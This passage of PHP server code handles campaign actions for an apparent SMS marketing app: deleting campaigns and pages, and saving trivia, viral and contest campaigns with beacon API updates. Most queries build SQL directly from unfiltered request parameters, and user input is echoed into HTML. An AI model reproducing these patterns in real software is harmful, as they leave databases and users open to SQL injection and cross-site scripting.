				$res = mysqli_query($link,$sql)or die(mysqli_error($link));

				if($res){

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Autoresponder saved successfully.</strong> .</div>';	

				}else{

					$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while saving autoresponder.</strong> .</div>';	

				}

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! <b>'.$_REQUEST['keyword'].'</b> is already used or maybe reserve keyword, try another.</strong> .</div>';

			}

			header('location: '.$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "delete_campaign":{

			$sel = "select media from campaigns where id='".$_REQUEST['id']."' and media!=''";

			$res = mysqli_query($link,$sel);

			$m   = mysqli_fetch_assoc($res);

			$media = $m['media'];

			

			$sql = "delete from campaigns where id='".$_REQUEST['id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				mysqli_query($link,"delete from subscribers_group_assignment where group_id='".$_REQUEST['id']."'");

				mysqli_query($link,"delete from follow_up_msgs where group_id='".$_REQUEST['id']."'");

				mysqli_query($link,"delete from schedulers where group_id='".$_REQUEST['id']."'");

				if(trim($media)!=''){

					removeMedia($media);

				}

                

                

                mysqli_query($link,"delete from trivia_questions where campaign_id='".$_REQUEST['id']."'");

                mysqli_query($link,"delete from trivia_answers where campaign_id='".$_REQUEST['id']."'");  

                

                

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Campaign is deleted.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! While deleting campaign.</strong> .</div>';

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

        

        case "delete_page":{

       	    mysqli_query($link,"delete from pages where id='".$_REQUEST['id']."'");

            $_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Page deleted successfully.</strong> .</div>';

            header("location: ".$_SERVER['HTTP_REFERER']);

        }

        break;

		

		case "update_campaign":{

			//echo '<pre>';

			//print_r($_REQUEST);

			//die();

			$specialChars = specialCharacters();

			$keyword = str_replace($specialChars,'',$_REQUEST['keyword']);

			if(checkKeyword($_SESSION['user_id'],$keyword,$_REQUEST['campaign_id'])){

				if($_FILES['campaign_media']['name']!=''){

					$ext = getExtension($_FILES['campaign_media']['name']);

					$extns = array('jpg','jpeg','png','bmp','gif');

					if(!in_array($ext,$extns)){

						$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! Select a valid file type.</strong> .</div>';

						header("location:".$_SERVER['HTTP_REFERER']);	

					}else{

						$fileName = uniqid().'_'.$_FILES['campaign_media']['name'];

						$tmpName  = $_FILES['campaign_media']['tmp_name'];

						@move_uploaded_file($tmpName,'uploads/'.$fileName);

						$fileName = getServerUrl().'/uploads/'.$fileName;

						removeMedia($_REQUEST['hidden_campaign_media']);

					}

				}else{

					$fileName = $_REQUEST['hidden_campaign_media'];

				}

				$title = DBin($_REQUEST['title']);

				$phoneNumber = $_REQUEST['phone_number'];

				$welcomeSms  = DBin($_REQUEST['welcome_sms']);

				$alreadyMemberSms = DBin($_REQUEST['already_member_sms']);

				$doubleOptin = DBin($_REQUEST['double_optin']);

                

                if(isset($_REQUEST['get_subs_email'])){

					$get_email = $_REQUEST['get_subs_email'];

				}else{

					$get_email = '0';

				}

				

				if($_REQUEST['attach_mobile_device']!='1')

					$_REQUEST['attach_mobile_device'] = '0';

					

				if($_REQUEST['double_optin_check']!='1')

					$_REQUEST['double_optin_check'] = '0';

				if($_REQUEST['get_subs_name_check']!='1')

					$_REQUEST['get_subs_name_check'] = '0';

				if($_REQUEST['campaign_expiry_check']!='1')

					$_REQUEST['campaign_expiry_check'] = '0';

				if($_REQUEST['followup_msg_check']!='1')

					$_REQUEST['followup_msg_check'] = '0';

				

                $reply_email = DBin($_REQUEST['reply_email']);

                $email_updated = DBin($_REQUEST['email_updated']);

                

				$sql = "update campaigns set

							title='".$title."',

							keyword='".$keyword."',

							phone_number='".$phoneNumber."',

							type='1',

							welcome_sms='".$welcomeSms."',

							already_member_msg='".$alreadyMemberSms."',

							media='".$fileName."',

							double_optin='".$doubleOptin."',

                            get_email='".$get_email."',

                            reply_email='".DBin($reply_email)."',

                            email_updated='".DBin($email_updated)."',

                            start_date='".$_REQUEST['start_date']."',

                            end_date='".$_REQUEST['end_date']."',

                            expire_message = '".DBin($_REQUEST['expire_message'])."',

							attach_mobile_device='".$_REQUEST['attach_mobile_device']."',

							double_optin_check='".$_REQUEST['double_optin_check']."',

							get_subs_name_check='".$_REQUEST['get_subs_name_check']."',

							msg_to_get_subscriber_name='".DBin($_REQUEST['msg_to_get_subscriber_name'])."',

							name_received_confirmation_msg='".$_REQUEST['name_received_confirmation_msg']."',

							campaign_expiry_check='".$_REQUEST['campaign_expiry_check']."',

							double_optin_confirm_message='".DBin($_REQUEST['double_optin_confirm_message'])."',

							followup_msg_check='".$_REQUEST['followup_msg_check']."',

                            

                            campaign_beacon_check='".$_REQUEST['campaign_beacon_check']."',

                            beacon='".$_REQUEST['beacon']."',

                            beacon_url_type='".$_REQUEST['beacon_url_type']."',

                            coupon='".$_REQUEST['coupon']."',

                            custom_url='".$_REQUEST['custom_url']."'

                            

						where

							id='".$_REQUEST['campaign_id']."'";

				$res = mysqli_query($link,$sql);

				if($res){

				    

                    /////////////// beacon api code //////////////

                    

                    if($_REQUEST['campaign_beacon_check']=="1" && $_REQUEST['beacon']!=""){

                     

                        $sql_as = "select estimote_app_id,estimote_app_token from application_settings where user_id='".$_SESSION['user_id']."'";

                    	$res_as = mysqli_query($link,$sql_as);

                    	$row_as = mysqli_fetch_assoc($res_as);

                        $AppID = $row_as['estimote_app_id'];

                        $AppToken = $row_as['estimote_app_token'];

                        

                        $identifier = $_REQUEST['beacon'];

                        

                        if($_REQUEST['beacon_url_type']=="1"){

                            

                            $sql_pages = "select * from pages where id='".$_REQUEST['coupon']."'";

                        	$res_pages = mysqli_query($link,$sql_pages);

                        	$row_pages = mysqli_fetch_assoc($res_pages);

                            $eddystone_url = $row_pages['short_url'];

                        }else{

                            $eddystone_url = $_REQUEST['custom_url'];

                        }

                        

                        $url = "https://$AppID:$AppToken@cloud.estimote.com/v2/devices/$identifier";

                        $data = '{

                           "settings": {

                             "advertisers": {

                               "eddystone_url": [{

                                 "index": 1,

                                 "name": "Eddystone URL",

                                 "enabled": true,

                                 "interval": 300,

                                 "power": "-4",

                                 "url" : "'.$eddystone_url.'"        

                               }]

                             }

                           }

                        }';

                                           

                        $res = curl_process22($url,$data);

                        

                    }

                    /////////////// beacon api code //////////////

                    

                    

                    

					// Addin follow up messages

					$campaignID = $_REQUEST['campaign_id'];

					$mediaCount = 0;

					$failedMediaCount = 0;

					$followUpCount = 0;

					mysqli_query($link,"delete from follow_up_msgs where group_id='".$campaignID."'");

					for($i=0;$i<count($_REQUEST['delay_day']);$i++){

						if((trim($_REQUEST['delay_day'][$i])!='') && (trim($_REQUEST['delay_message'][$i])!='')){

							if($_FILES['delay_media']['name'][$i]!=''){

								$ext = getExtension($_FILES['delay_media']['name'][$i]);

								$extns = array('jpg','jpeg','png','bmp','gif');

								if(!in_array($ext,$extns)){

									$failedMediaCount++;

								}else{

									removeMedia($_REQUEST['hidden_delay_media'][$i]);

									$fileName = uniqid().'_'.$_FILES['delay_media']['name'][$i];

									$tmpName  = $_FILES['delay_media']['tmp_name'][$i];

									@move_uploaded_file($tmpName,'uploads/'.$fileName);

									$fileName = getServerUrl().'/uploads/'.$fileName;

									$mediaCount++;

								}

							}else{

								$fileName = $_REQUEST['hidden_delay_media'][$i];	

							}

							$sqlFollow = "insert into follow_up_msgs

									(group_id,delay_day,delay_time,message,media,user_id)values

									('".$campaignID."','".$_REQUEST['delay_day'][$i]."','".date('H:i:s', strtotime($_REQUEST['delay_time']))[$i]."','".DBin($_REQUEST['delay_message'][$i])."','".$fileName."','".$_SESSION['user_id']."')";

							$resFollow = mysqli_query($link,$sqlFollow);

							if($resFollow){

								$followUpCount++;

							}

						}

					}

					// end follow up messages

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Campaign has been updated successfully with <b>'.$followUpCount.'</b> follow up messages.</strong> .</div>';	

				}else{

					$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating campaign.</strong> .</div>';	

				}

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! <b>'.$_REQUEST['keyword'].'</b> is already used or maybe reserve keyword, try another.</strong> .</div>';

			}

            header('location: view_campaigns.php');

		}

		break;

        

        

        case "add_trivia":{

            

                        

			$specialChars = specialCharacters();

			$keyword = str_replace($specialChars,'',$_REQUEST['keyword']);

			if(checkKeyword($_SESSION['user_id'],$keyword,$_REQUEST['campaign_id'])){

				if($_FILES['campaign_media']['name']!=''){

					$ext = getExtension($_FILES['campaign_media']['name']);

					$extns = array('jpg','jpeg','png','bmp','gif');

					if(!in_array($ext,$extns)){

						$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! Select a valid file type.</strong> .</div>';

						header("location:".$_SERVER['HTTP_REFERER']);	

					}else{

						$fileName = uniqid().'_'.$_FILES['campaign_media']['name'];

						$tmpName  = $_FILES['campaign_media']['tmp_name'];

						@move_uploaded_file($tmpName,'uploads/'.$fileName);

						$fileName = getServerUrl().'/uploads/'.$fileName;

						removeMedia($_REQUEST['hidden_campaign_media']);

					}

				}else{

					$fileName = $_REQUEST['hidden_campaign_media'];

				}

				$title = DBin($_REQUEST['title']);

				$phoneNumber = $_REQUEST['phone_number'];

				$welcomeSms  = DBin($_REQUEST['welcome_sms']);

				$alreadyMemberSms = DBin($_REQUEST['already_member_sms']);

				$doubleOptin = DBin($_REQUEST['double_optin']);

                

                if(isset($_REQUEST['get_subs_email'])){

					$get_email = $_REQUEST['get_subs_email'];

				}else{

					$get_email = '0';

				}

				

				if($_REQUEST['attach_mobile_device']!='1')

					$_REQUEST['attach_mobile_device'] = '0';

					

				if($_REQUEST['double_optin_check']!='1')

					$_REQUEST['double_optin_check'] = '0';

				if($_REQUEST['get_subs_name_check']!='1')

					$_REQUEST['get_subs_name_check'] = '0';

				if($_REQUEST['campaign_expiry_check']!='1')

					$_REQUEST['campaign_expiry_check'] = '0';

				if($_REQUEST['followup_msg_check']!='1')

					$_REQUEST['followup_msg_check'] = '0';

				

                $reply_email = DBin($_REQUEST['reply_email']);

                $email_updated = DBin($_REQUEST['email_updated']);

                

                if(isset($_REQUEST['campaign_id']) && $_REQUEST['campaign_id']!=""){

                    

                    $sql = "update campaigns set

						title='".$title."',

						keyword='".$keyword."',

						phone_number='".$phoneNumber."',

						type='3',

						welcome_sms='".$welcomeSms."',

                        correct_sms='".$_REQUEST['correct_sms']."',

                        wrong_sms='".$_REQUEST['wrong_sms']."',

                        complete_sms='".$_REQUEST['complete_sms']."',

						already_member_msg='".$alreadyMemberSms."',

						media='".$fileName."',

						double_optin='".$doubleOptin."',

                        get_email='".$get_email."',

                        reply_email='".DBin($reply_email)."',

                        email_updated='".DBin($email_updated)."',

                        start_date='".$_REQUEST['start_date']."',

                        end_date='".$_REQUEST['end_date']."',

                        expire_message = '".DBin($_REQUEST['expire_message'])."',

						attach_mobile_device='".$_REQUEST['attach_mobile_device']."',

						double_optin_check='".$_REQUEST['double_optin_check']."',

						get_subs_name_check='".$_REQUEST['get_subs_name_check']."',

						msg_to_get_subscriber_name='".DBin($_REQUEST['msg_to_get_subscriber_name'])."',

						name_received_confirmation_msg='".$_REQUEST['name_received_confirmation_msg']."',

						campaign_expiry_check='".$_REQUEST['campaign_expiry_check']."',

						double_optin_confirm_message='".DBin($_REQUEST['double_optin_confirm_message'])."',

						followup_msg_check='".$_REQUEST['followup_msg_check']."',

                        

                        campaign_beacon_check='".$_REQUEST['campaign_beacon_check']."',

                        beacon='".$_REQUEST['beacon']."',

                        beacon_url_type='".$_REQUEST['beacon_url_type']."',

                        coupon='".$_REQUEST['coupon']."',

                        custom_url='".$_REQUEST['custom_url']."'

                        

					where

						id='".$_REQUEST['campaign_id']."'";

                            

                }else{

                 

                    $sql = "insert into campaigns

    					(

    						title,

    						keyword,

    						phone_number,

    						type,

    						welcome_sms,

                            correct_sms,

                            wrong_sms,

                            complete_sms,

    						already_member_msg,

    						media,

    						user_id,

    						double_optin,

    						get_email,

    						reply_email,

    						email_updated,

    						start_date,

    						end_date,

    						expire_message,

    						attach_mobile_device,

    						double_optin_check,

    						get_subs_name_check,

    						msg_to_get_subscriber_name,

    						name_received_confirmation_msg,

    						campaign_expiry_check,

    						double_optin_confirm_message,

    						followup_msg_check,

                            

                            campaign_beacon_check,

                            beacon,

                            beacon_url_type,

                            coupon,

                            custom_url

    					)

    				values

    					(

    						'".$title."',

    						'".$keyword."',

    						'".$phoneNumber."',

    						'3',

    						'".$welcomeSms."',

                            '".$_REQUEST['correct_sms']."',

                            '".$_REQUEST['wrong_sms']."',

                            '".$_REQUEST['complete_sms']."',

    						'".$alreadyMemberSms."',

    						'".$fileName."',

    						'".$_SESSION['user_id']."',

    						'".$doubleOptin."',

    						'".$get_email."',

    						'".$reply_email."',

    						'".$email_updated."',

    						'".$_REQUEST['start_date']."',

    						'".$_REQUEST['end_date']."',

    						'".$_REQUEST['expire_message']."',

    						'".$_REQUEST['attach_mobile_device']."',

    						'".$_REQUEST['double_optin_check']."',

    						'".$_REQUEST['get_subs_name_check']."',

    						'".DBin($_REQUEST['msg_to_get_subscriber_name'])."',

    						'".DBin($_REQUEST['name_received_confirmation_msg'])."',

    						'".$_REQUEST['campaign_expiry_check']."',

    						'".DBin($_REQUEST['double_optin_confirm_message'])."',

    						'".$_REQUEST['followup_msg_check']."',

                            

                            '".$_REQUEST['campaign_beacon_check']."',

                            '".$_REQUEST['beacon']."',

                            '".$_REQUEST['beacon_url_type']."',

                            '".$_REQUEST['coupon']."',

                            '".$_REQUEST['custom_url']."'

    					)";

                    

                }

                

                

                            

				$res = mysqli_query($link,$sql) or die(mysqli_error());

                

                

                if(isset($_REQUEST['campaign_id']) && $_REQUEST['campaign_id']!=""){

                    $campaignID = $_REQUEST['campaign_id'];

                    

                    mysqli_query($link,"delete from trivia_questions where campaign_id='".$_REQUEST['campaign_id']."'");

                    mysqli_query($link,"delete from trivia_answers where campaign_id='".$_REQUEST['campaign_id']."'");

                                        

                }else{

                    $campaignID = mysqli_insert_id($link);

                }

                

                

                if(isset($_REQUEST['field']) && count($_REQUEST['field'])>0)

                {

                    foreach($_REQUEST['field'] as $question){

                        

                        $sql_q = "insert into trivia_questions (question,user_id,campaign_id) values ('".DBin($question['question'])."','".$_SESSION['user_id']."','".$campaignID."')";

                        mysqli_query($link,$sql_q);

                        $questionID = mysqli_insert_id($link);

                        

                        if(isset($question['answers']) && count($question['answers'])>0)

                        {

                            foreach($question['answers'] as $answer){

                                

                                $sql_n = "insert into trivia_answers (answer,value,correct,question_id,user_id,campaign_id) values ('".DBin($answer['answer'])."','".$answer['value']."','".@$answer['correct']."','".$questionID."','".$_SESSION['user_id']."','".$campaignID."')";

                                mysqli_query($link,$sql_n);

                                

                            }

                        }

                        

                        

                    }

                }

                

                

				if($res){

				    

                    /////////////// beacon api code //////////////

                    

                    if($_REQUEST['campaign_beacon_check']=="1" && $_REQUEST['beacon']!=""){

                     

                        $sql_as = "select estimote_app_id,estimote_app_token from application_settings where user_id='".$_SESSION['user_id']."'";

                    	$res_as = mysqli_query($link,$sql_as);

                    	$row_as = mysqli_fetch_assoc($res_as);

                        $AppID = $row_as['estimote_app_id'];

                        $AppToken = $row_as['estimote_app_token'];

                        

                        $identifier = $_REQUEST['beacon'];

                        

                        if($_REQUEST['beacon_url_type']=="1"){

                            

                            $sql_pages = "select * from pages where id='".$_REQUEST['coupon']."'";

                        	$res_pages = mysqli_query($link,$sql_pages);

                        	$row_pages = mysqli_fetch_assoc($res_pages);

                            $eddystone_url = $row_pages['short_url'];

                        }else{

                            $eddystone_url = $_REQUEST['custom_url'];

                        }

                        

                        $url = "https://$AppID:$AppToken@cloud.estimote.com/v2/devices/$identifier";

                        $data = '{

                           "settings": {

                             "advertisers": {

                               "eddystone_url": [{

                                 "index": 1,

                                 "name": "Eddystone URL",

                                 "enabled": true,

                                 "interval": 300,

                                 "power": "-4",

                                 "url" : "'.$eddystone_url.'"        

                               }]

                             }

                           }

                        }';

                                           

                        $res = curl_process22($url,$data);

                        

                    }

                    /////////////// beacon api code //////////////

                    

                    

                    

					// Addin follow up messages

					

					$mediaCount = 0;

					$failedMediaCount = 0;

					$followUpCount = 0;

					mysqli_query($link,"delete from follow_up_msgs where group_id='".$campaignID."'");

					for($i=0;$i<count($_REQUEST['delay_day']);$i++){

						if((trim($_REQUEST['delay_day'][$i])!='') && (trim($_REQUEST['delay_message'][$i])!='')){

							if($_FILES['delay_media']['name'][$i]!=''){

								$ext = getExtension($_FILES['delay_media']['name'][$i]);

								$extns = array('jpg','jpeg','png','bmp','gif');

								if(!in_array($ext,$extns)){

									$failedMediaCount++;

								}else{

									removeMedia($_REQUEST['hidden_delay_media'][$i]);

									$fileName = uniqid().'_'.$_FILES['delay_media']['name'][$i];

									$tmpName  = $_FILES['delay_media']['tmp_name'][$i];

									@move_uploaded_file($tmpName,'uploads/'.$fileName);

									$fileName = getServerUrl().'/uploads/'.$fileName;

									$mediaCount++;

								}

							}else{

								$fileName = $_REQUEST['hidden_delay_media'][$i];	

							}

							$sqlFollow = "insert into follow_up_msgs

									(group_id,delay_day,delay_time,message,media,user_id)values

									('".$campaignID."','".$_REQUEST['delay_day'][$i]."','".date('H:i:s', strtotime($_REQUEST['delay_time']))[$i]."','".DBin($_REQUEST['delay_message'][$i])."','".$fileName."','".$_SESSION['user_id']."')";

							$resFollow = mysqli_query($link,$sqlFollow);

							if($resFollow){

								$followUpCount++;

							}

						}

					}

					// end follow up messages

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Campaign has been saved successfully with <b>'.$followUpCount.'</b> follow up messages.</strong> .</div>';	

				}else{

					$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating campaign.</strong> .</div>';	

				}

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! <b>'.$_REQUEST['keyword'].'</b> is already used or maybe reserve keyword, try another.</strong> .</div>';

			}

			header('location: trivias.php');

		

            

            

            

        }

        break;

        

        

        case "add_viral":{

            

            

                        

			$specialChars = specialCharacters();

			$keyword = str_replace($specialChars,'',$_REQUEST['keyword']);

			if(checkKeyword($_SESSION['user_id'],$keyword,$_REQUEST['campaign_id'])){

				if($_FILES['campaign_media']['name']!=''){

					$ext = getExtension($_FILES['campaign_media']['name']);

					$extns = array('jpg','jpeg','png','bmp','gif');

					if(!in_array($ext,$extns)){

						$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! Select a valid file type.</strong> .</div>';

						header("location:".$_SERVER['HTTP_REFERER']);	

					}else{

						$fileName = uniqid().'_'.$_FILES['campaign_media']['name'];

						$tmpName  = $_FILES['campaign_media']['tmp_name'];

						@move_uploaded_file($tmpName,'uploads/'.$fileName);

						$fileName = getServerUrl().'/uploads/'.$fileName;

						removeMedia($_REQUEST['hidden_campaign_media']);

					}

				}else{

					$fileName = $_REQUEST['hidden_campaign_media'];

				}

				$title = DBin($_REQUEST['title']);

				$phoneNumber = $_REQUEST['phone_number'];

				$welcomeSms  = DBin($_REQUEST['welcome_sms']);

				$alreadyMemberSms = DBin($_REQUEST['already_member_sms']);

				$doubleOptin = DBin($_REQUEST['double_optin']);

                

                if(isset($_REQUEST['get_subs_email'])){

					$get_email = $_REQUEST['get_subs_email'];

				}else{

					$get_email = '0';

				}

				

				if($_REQUEST['attach_mobile_device']!='1')

					$_REQUEST['attach_mobile_device'] = '0';

					

				if($_REQUEST['double_optin_check']!='1')

					$_REQUEST['double_optin_check'] = '0';

				if($_REQUEST['get_subs_name_check']!='1')

					$_REQUEST['get_subs_name_check'] = '0';

				if($_REQUEST['campaign_expiry_check']!='1')

					$_REQUEST['campaign_expiry_check'] = '0';

				if($_REQUEST['followup_msg_check']!='1')

					$_REQUEST['followup_msg_check'] = '0';

				

                $reply_email = DBin($_REQUEST['reply_email']);

                $email_updated = DBin($_REQUEST['email_updated']);

                

                if(isset($_REQUEST['campaign_id']) && $_REQUEST['campaign_id']!=""){

                    

                    $sql = "update campaigns set

						title='".$title."',

						keyword='".$keyword."',

						phone_number='".$phoneNumber."',

						type='4',

                        welcome_sms='".$welcomeSms."',

                        

                        code_message='".$_REQUEST['code_message']."',

                        notification_msg='".$_REQUEST['notification_msg']."',

                        winning_number='".$_REQUEST['winning_number']."',

                        winner_msg='".$_REQUEST['winner_msg']."',

                        

						already_member_msg='".$alreadyMemberSms."',

						media='".$fileName."',

						double_optin='".$doubleOptin."',

                        get_email='".$get_email."',

                        reply_email='".DBin($reply_email)."',

                        email_updated='".DBin($email_updated)."',

                        start_date='".$_REQUEST['start_date']."',

                        end_date='".$_REQUEST['end_date']."',

                        expire_message = '".DBin($_REQUEST['expire_message'])."',

						attach_mobile_device='".$_REQUEST['attach_mobile_device']."',

						double_optin_check='".$_REQUEST['double_optin_check']."',

						get_subs_name_check='".$_REQUEST['get_subs_name_check']."',

						msg_to_get_subscriber_name='".DBin($_REQUEST['msg_to_get_subscriber_name'])."',

						name_received_confirmation_msg='".$_REQUEST['name_received_confirmation_msg']."',

						campaign_expiry_check='".$_REQUEST['campaign_expiry_check']."',

						double_optin_confirm_message='".DBin($_REQUEST['double_optin_confirm_message'])."',

						followup_msg_check='".$_REQUEST['followup_msg_check']."',

                        

                        campaign_beacon_check='".$_REQUEST['campaign_beacon_check']."',

                        beacon='".$_REQUEST['beacon']."',

                        beacon_url_type='".$_REQUEST['beacon_url_type']."',

                        coupon='".$_REQUEST['coupon']."',

                        custom_url='".$_REQUEST['custom_url']."'

                        

					where

						id='".$_REQUEST['campaign_id']."'";

                            

                }else{

                    $sql = "insert into campaigns

    					(

    						title,

    						keyword,

    						phone_number,

    						type,

    						welcome_sms,

                            

                            code_message,

                            notification_msg,

                            winning_number,

                            winner_msg,

                            

    						already_member_msg,

    						media,

    						user_id,

    						double_optin,

    						get_email,

    						reply_email,

    						email_updated,

    						start_date,

    						end_date,

    						expire_message,

    						attach_mobile_device,

    						double_optin_check,

    						get_subs_name_check,

    						msg_to_get_subscriber_name,

    						name_received_confirmation_msg,

    						campaign_expiry_check,

    						double_optin_confirm_message,

    						followup_msg_check,

                            

                            campaign_beacon_check,

                            beacon,

                            beacon_url_type,

                            coupon,

                            custom_url

    					)

    				values

    					(

    						'".$title."',

    						'".$keyword."',

    						'".$phoneNumber."',

    						'4',

    						'".$welcomeSms."',

                            

                            '".$_REQUEST['code_message']."',

                            '".$_REQUEST['notification_msg']."',

                            '".$_REQUEST['winning_number']."',

                            '".$_REQUEST['winner_msg']."',

    						

                            '".$alreadyMemberSms."',

    						'".$fileName."',

    						'".$_SESSION['user_id']."',

    						'".$doubleOptin."',

    						'".$get_email."',

    						'".$reply_email."',

    						'".$email_updated."',

    						'".$_REQUEST['start_date']."',

    						'".$_REQUEST['end_date']."',

    						'".$_REQUEST['expire_message']."',

    						'".$_REQUEST['attach_mobile_device']."',

    						'".$_REQUEST['double_optin_check']."',

    						'".$_REQUEST['get_subs_name_check']."',

    						'".DBin($_REQUEST['msg_to_get_subscriber_name'])."',

    						'".DBin($_REQUEST['name_received_confirmation_msg'])."',

    						'".$_REQUEST['campaign_expiry_check']."',

    						'".DBin($_REQUEST['double_optin_confirm_message'])."',

    						'".$_REQUEST['followup_msg_check']."',

                            

                            '".$_REQUEST['campaign_beacon_check']."',

                            '".$_REQUEST['beacon']."',

                            '".$_REQUEST['beacon_url_type']."',

                            '".$_REQUEST['coupon']."',

                            '".$_REQUEST['custom_url']."'

    					)";

                    

                }

                            

				$res = mysqli_query($link,$sql) or die(mysqli_error());

                

                if(isset($_REQUEST['campaign_id']) && $_REQUEST['campaign_id']!=""){

                    $campaignID = $_REQUEST['campaign_id'];                  

                }else{

                    $campaignID = mysqli_insert_id($link);

                }

                

                

				if($res){    

                    /////////////// beacon api code //////////////

                    

                    if($_REQUEST['campaign_beacon_check']=="1" && $_REQUEST['beacon']!=""){

                     

                        $sql_as = "select estimote_app_id,estimote_app_token from application_settings where user_id='".$_SESSION['user_id']."'";

                    	$res_as = mysqli_query($link,$sql_as);

                    	$row_as = mysqli_fetch_assoc($res_as);

                        $AppID = $row_as['estimote_app_id'];

                        $AppToken = $row_as['estimote_app_token'];

                        

                        $identifier = $_REQUEST['beacon'];

                        

                        if($_REQUEST['beacon_url_type']=="1"){

                            

                            $sql_pages = "select * from pages where id='".$_REQUEST['coupon']."'";

                        	$res_pages = mysqli_query($link,$sql_pages);

                        	$row_pages = mysqli_fetch_assoc($res_pages);

                            $eddystone_url = $row_pages['short_url'];

                        }else{

                            $eddystone_url = $_REQUEST['custom_url'];

                        }

                        

                        $url = "https://$AppID:$AppToken@cloud.estimote.com/v2/devices/$identifier";

                        $data = '{

                           "settings": {

                             "advertisers": {

                               "eddystone_url": [{

                                 "index": 1,

                                 "name": "Eddystone URL",

                                 "enabled": true,

                                 "interval": 300,

                                 "power": "-4",

                                 "url" : "'.$eddystone_url.'"        

                               }]

                             }

                           }

                        }';

                                           

                        $res = curl_process22($url,$data);

                        

                    }

                    /////////////// beacon api code //////////////

                    

                    

                    

					// Addin follow up messages

					

					$mediaCount = 0;

					$failedMediaCount = 0;

					$followUpCount = 0;

					mysqli_query($link,"delete from follow_up_msgs where group_id='".$campaignID."'");

					for($i=0;$i<count($_REQUEST['delay_day']);$i++){

						if((trim($_REQUEST['delay_day'][$i])!='') && (trim($_REQUEST['delay_message'][$i])!='')){

							if($_FILES['delay_media']['name'][$i]!=''){

								$ext = getExtension($_FILES['delay_media']['name'][$i]);

								$extns = array('jpg','jpeg','png','bmp','gif');

								if(!in_array($ext,$extns)){

									$failedMediaCount++;

								}else{

									removeMedia($_REQUEST['hidden_delay_media'][$i]);

									$fileName = uniqid().'_'.$_FILES['delay_media']['name'][$i];

									$tmpName  = $_FILES['delay_media']['tmp_name'][$i];

									@move_uploaded_file($tmpName,'uploads/'.$fileName);

									$fileName = getServerUrl().'/uploads/'.$fileName;

									$mediaCount++;

								}

							}else{

								$fileName = $_REQUEST['hidden_delay_media'][$i];	

							}

							$sqlFollow = "insert into follow_up_msgs

									(group_id,delay_day,delay_time,message,media,user_id)values

									('".$campaignID."','".$_REQUEST['delay_day'][$i]."','".date('H:i:s', strtotime($_REQUEST['delay_time']))[$i]."','".DBin($_REQUEST['delay_message'][$i])."','".$fileName."','".$_SESSION['user_id']."')";

							$resFollow = mysqli_query($link,$sqlFollow);

							if($resFollow){

								$followUpCount++;

							}

						}

					}

					// end follow up messages

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Campaign has been saved successfully with <b>'.$followUpCount.'</b> follow up messages.</strong> .</div>';	

				}else{

					$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating campaign.</strong> .</div>';	

				}

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! <b>'.$_REQUEST['keyword'].'</b> is already used or maybe reserve keyword, try another.</strong> .</div>';

			}

			header('location: virals.php');

		

            

            

            

        }

        break;    

        

        case "add_contest":{

            

            

                        

			$specialChars = specialCharacters();

			$keyword = str_replace($specialChars,'',$_REQUEST['keyword']);

			if(checkKeyword($_SESSION['user_id'],$keyword,$_REQUEST['campaign_id'])){

				if($_FILES['campaign_media']['name']!=''){

					$ext = getExtension($_FILES['campaign_media']['name']);

					$extns = array('jpg','jpeg','png','bmp','gif');

					if(!in_array($ext,$extns)){

						$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! Select a valid file type.</strong> .</div>';

						header("location:".$_SERVER['HTTP_REFERER']);	

					}else{

						$fileName = uniqid().'_'.$_FILES['campaign_media']['name'];

						$tmpName  = $_FILES['campaign_media']['tmp_name'];

						@move_uploaded_file($tmpName,'uploads/'.$fileName);

						$fileName = getServerUrl().'/uploads/'.$fileName;

						removeMedia($_REQUEST['hidden_campaign_media']);

					}

				}else{

					$fileName = $_REQUEST['hidden_campaign_media'];

				}

				$title = DBin($_REQUEST['title']);

				$phoneNumber = $_REQUEST['phone_number'];

				$welcomeSms  = DBin($_REQUEST['welcome_sms']);

				$alreadyMemberSms = DBin($_REQUEST['already_member_sms']);

				$doubleOptin = DBin($_REQUEST['double_optin']);

                

                if(isset($_REQUEST['get_subs_email'])){

					$get_email = $_REQUEST['get_subs_email'];

				}else{

					$get_email = '0';

				}

				

				if($_REQUEST['attach_mobile_device']!='1')

					$_REQUEST['attach_mobile_device'] = '0';

					

				if($_REQUEST['double_optin_check']!='1')

					$_REQUEST['double_optin_check'] = '0';

				if($_REQUEST['get_subs_name_check']!='1')

					$_REQUEST['get_subs_name_check'] = '0';

				if($_REQUEST['campaign_expiry_check']!='1')

					$_REQUEST['campaign_expiry_check'] = '0';

				if($_REQUEST['followup_msg_check']!='1')

					$_REQUEST['followup_msg_check'] = '0';

				

                $reply_email = DBin($_REQUEST['reply_email']);

                $email_updated = DBin($_REQUEST['email_updated']);

                

                if(isset($_REQUEST['campaign_id']) && $_REQUEST['campaign_id']!=""){

                    

                    $sql = "update campaigns set

						title='".$title."',

						keyword='".$keyword."',

						phone_number='".$phoneNumber."',

						type='0',

                        

                        

                        winning_number='".$_REQUEST['winning_number']."',

                        winner_msg='".$_REQUEST['winner_msg']."',

                        looser_msg='".$_REQUEST['looser_msg']."',

                        

						already_member_msg='".$alreadyMemberSms."',

						media='".$fileName."',

						double_optin='".$doubleOptin."',

                        get_email='".$get_email."',

                        reply_email='".DBin($reply_email)."',

                        email_updated='".DBin($email_updated)."',

                        start_date='".$_REQUEST['start_date']."',

                        end_date='".$_REQUEST['end_date']."',

                        expire_message = '".DBin($_REQUEST['expire_message'])."',

